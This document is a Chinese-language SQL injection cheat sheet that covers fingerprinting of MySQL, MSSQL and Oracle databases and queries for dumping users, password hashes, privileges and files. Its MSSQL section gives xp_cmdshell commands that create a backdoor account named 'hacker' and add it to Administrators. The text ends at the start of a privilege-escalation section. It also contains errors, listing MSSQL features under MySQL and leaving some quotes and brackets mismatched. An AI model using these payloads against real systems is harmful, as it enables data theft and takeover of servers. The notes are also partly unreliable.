# SQL 注入


## 不同数据库的区别

### 基本信息探测

1. 数据库类型探测
   - MSSQL
     - 具有全局变量 @@version, @@servername
     - 特有函数: db_name()
     - 判断是否有特有表: sysobjects, select * from sysobjects
     - 判断是否支持子语句查询: select count(1) from [sysobjects]
   - MySQL
     - load data infile, load_file, 用于读取文件
     - select ... into dumpfile/outfile用于写入文件
     - bulk insert 语句, 可用于读取源文件, 配置文件, 证书文件
     - sp_oamethod, sp_oacreate, xp_fileexist
   - ORACLE
     - utl_file 包, java存储过程
     - oracle 读取数据时需要跟上表名, 没有的情况下可以使用虚表 Dual, 那么可以通过判断带 `Dual` 的语句是否正常执行, 即可判断数据库是否为oracle
       - eg. select user from Dual

2. MySQL 注入基础语句
   - 查询版本, select @@version
   - 查询用户名, select user()
   - 查询系统用户名, select system_user()
   - 查询所有用户: select user, super_priv from mysql.user
   - databases: select schema_name from information_schema.schemata
   - tables: select table_schema, table_name from information_schema.columns
   - columns: select table_name, column_name from information_schema.columns
   - current database name: select database()
   - query another database
     - use <database_name>; select database();
     - select <column> from <database_name>.<table_name>
   - number of columns:select count(*) from information_schema.columns where table_name = '<table_name>'
   - dba accounts: select host, user from mysql.user where super_priv='Y'
   - hashes password hashes: select host, user password from mysql.user
   - schema: select schema()
   - path to db data: select @@datadir
   - read files: select load_file('/file/to/read')

3. MSSQL 注入基础语句
   - xp_cmdshell: select count(*) from master.dbo.sysobjects where name='xp_cmdshell')
   - xp_regread: select count(*) from master.dbo.sysobjects where name='xp_regread')
   - xp_addextendedproc: select count(*) from master.dbo.sysobjects where name='xp_addextendedproc')
   - xp_subdirs: select count(*) from master.dbo.sysobjects where name='xp_subdirs')
   - xp_dirtree: select count(*) from master.dbo.sysobjects where name='xp_dirtree')
   - sysobjects: select * from sysobjects
   - 判断是不是 sysadmin, public角色成员: select IS_SRVROLEMEMBER('sysadmin')
   - 判断是不是 db_owner角色成员: select IS_MEMBER('db_owner')
   - 判断师傅是可以读取其他库: select HAS_DBACCESS('master')
   - 版本判断: select @@VERSION
   - 判断本地服务器名: select @@servername
   - 判断是否支持多行: ;declare @d int
   - 判断是否支持注释符(两个-, 一个空格): -- abcd
   - 判断是否支持注释符 /**/
   - 判断是否支持子语句查询
   - 判断服务器登录名, 如果出现dbo, 证明是sa登录名
   - 判断数据库名
     - and (select db_name()) > 0
     - and (select top 1 name from master.dbo.sysdatabases where name not in (select top N name from master.dbo.sysdatabases order by dbid)) > 1
   - 判断表名: select top 1 name from sysobjects where xtype='u' and name not in (select top N name from sysobjects where xtype='u')
   - 判断列名: 
     - select * from aspcms_admin having 1=1 /*aspcms_admin.ID*/
     - select * from aspcms_admin group by aspcms_admin.ID having 1=1 /*aspcms_admin.usernmae*/
     - select top 1 col_name(object_id('aspcms_admin'), N) from sysobjects)
   - 判断字段内容, 观察页面输出数字
     - select 1, 2, 3 from aspcms_admin
   - 判断字段内容, 爆内容
     - select id, usernmae, password from aspcms_admin
   - 利用 xp_cmdshell 提权, 这里本质上是用xp_cmdshell执行cmd命令, 用 net 命令创建了高权限用户: 
     - exec master.dbo.xp_cmdshell 'net user hacker 123qwe /workstations: * /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';-- 
     - exec master.dbo.xp_cmdshell 'net localgroup administrators hacker /add'; --

4. Oracle 注入基础语句
  - Version 查询
    - select banner from v$version where banner like 'Oracle%';
    - select banner from v$version where banner like 'TNS%";
    - select version from v$instance;
  - user 查询用户: select user from Dual
  - user 查询所有用户: 
    - select username from all_users order by username;
    - select name from sys.user$;
  - Tables 查询所有表
    - select table_name from all_tables;
    - select owner, table_name from all_tables;
  - 查询表中的列:
    - select owner, table_name from all_tab_columns where column_name like '%PASS%';
  - 查询所有列
    - select column_name from all_tab_columns where table_name = '<table name>';
    - select column_name from all_tab_columns where table_name = '<table name>' and owner = '<user name>';
  - 查询当前数据库
    - select global_name from global_name
    - select name from v$database;
    - select instance_name from v$instance;
    - select sys.database_name from dual;
  - 查询database所有数据库:
    - select distinct owner from all_tables;
  - DBA账户: select distinct grantee from dba_sys_privs where admin_option = 'yes'
  - Privileges
    - select * from session_privs; (retrieves current privs)
    - select * from dba_sys_privs where grantee = 'DBSNMP';
    - select grantee from dba_sys_privs where privilege = 'select any dictionary'
    - select grantee, granted_role from dba_role_privs;
  - location of db files:
    - select name from v$datafile
  - hostname, ip address:
    - select UTL_INADDR.get_host_name from Dual;
    - select host_name from v$instance;
    - select UTL_INADDR.get_host_address from Dual; (Gets Ip address)
    - select UTL_INADDR.get_host_name("ip address) from Dual, (gets hostname)

### 提权

#### MSSQL

1. 利用 xp_cmdshell 执行系统命令, 进行高权限账号操作